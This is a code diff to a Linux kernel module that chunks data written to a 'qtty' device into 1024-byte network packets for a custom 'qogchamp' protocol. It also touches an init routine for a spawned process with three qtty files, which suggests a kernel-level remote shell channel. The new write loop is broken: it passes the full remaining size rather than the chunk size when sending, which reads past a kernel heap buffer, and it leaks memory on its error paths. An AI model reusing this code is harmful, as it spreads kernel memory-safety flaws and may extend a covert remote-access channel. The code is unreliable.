@@ -38,30 +38,46 @@ Eventually, when we are done with cur_command, we will pull it off
 
 */
 struct command* cur_command = NULL; //the command we are currently processing
-    
-ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t* off){
+
+#define WRITE_SIZE 1024 //how big the data payload is for each qogchamp skb. This is tunable.   
+
+ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t* off){ //qtty writes in blocks of 1024 bytes so as to prevent any MTU issues
 
   //fragmentation into MTU sized blocks should happen here. 
-    printk(KERN_INFO "WRITING\n");
-    char* kbuf = (char*)kmalloc(size, GFP_KERNEL); //make sure the string actually terminates so add 1 
-    if(!kbuf){
-      return -ENOMEM;
-    }
-    if(!access_ok(buf, size)){
-        return -EFAULT;
+   // printk(KERN_INFO "WRITING\n");
+    *off = 0;
+    size_t orig_size = size;
+
+    while(size){
+
+      size_t to_write = size < WRITE_SIZE ? size : WRITE_SIZE;
+      
+      char* kbuf = (char*)kmalloc(to_write, GFP_KERNEL); //make sure the string actually terminates so add 1 
+
+      
+
+      if(!kbuf){
+        return -ENOMEM;
+      }
+      if(!access_ok(buf, size)){
+          return -EFAULT;
+      }
+
+      if(copy_from_user(kbuf, buf + *off, to_write)){ //copy_from_user returns 0
+          return -EFAULT; //invalid buffer
+      }
+      if(construct_and_send_skb(kbuf, size)){ 
+        return -EINVAL;
+      }
+      kfree(kbuf);
+      *off += WRITE_SIZE;
+      size -= to_write;
+      
     }
 
-    if(copy_from_user(kbuf, buf, size)){ //copy_from_user returns 0
-        return -EFAULT; //invalid buffer
-    }
-
-    if(construct_and_send_skb(kbuf, size)){ 
-      return -EINVAL;
-    }
+    *off=0; //reset offset
     
-    
-    
-    return size; //all or nothing lol. Might change this. 
+    return orig_size; //all or nothing lol. Might change this. 
 
 
     
@@ -197,8 +213,8 @@ DECLARE_WAIT_QUEUE_HEAD(qogchamp_wait); //wait queue for qogchamp. This is used 
 
 
 
-static int init_func(struct subprocess_info* info, struct cred* new){ 
-  int retval;
+static int init_func(struct subprocess_info* info, struct cred* new){ //TODO: change current working directory
+  int retval; 
   struct file* qtty_file_0;
   struct file* qtty_file_1;
   struct file* qtty_file_2;
